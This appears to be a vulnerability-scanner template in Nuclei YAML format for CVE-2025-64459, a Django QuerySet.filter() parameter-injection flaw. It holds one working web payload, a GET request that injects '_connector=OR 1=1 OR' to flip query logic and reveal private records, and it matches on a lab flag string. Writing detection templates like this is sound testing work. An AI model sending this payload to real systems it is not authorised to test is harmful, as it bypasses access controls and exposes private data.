id: CVE-2025-64459

info:
  name: Django QuerySet.filter() Parameter Injection
  author: hhsteam
  severity: high
  description: |
    Django 5.1.13 allows parameter injection in QuerySet.filter() when user input is passed directly via dictionary expansion.
    Attackers can inject internal parameters like _connector to manipulate query logic (e.g., changing AND to OR), bypassing filters.
  reference:
    - https://shivasurya.me/security/django/2025/11/07/django-sql-injection-CVE-2025-64459.html
    - https://vulnerabletarget.com/VT-2025-64459
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2025-64459
    cwe-id: CWE-89
  metadata:
    max-request: 1
  tags: cve,cve2025,django,injection,sqli

http:
  - method: GET
    path:
      - "{{BaseURL}}/search/?_connector=OR 1=1 OR&title__icontains=Area%2051%20Plans&status=private"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "VT{2025-64459}"
        condition: and

      - type: status
        status:
          - 200
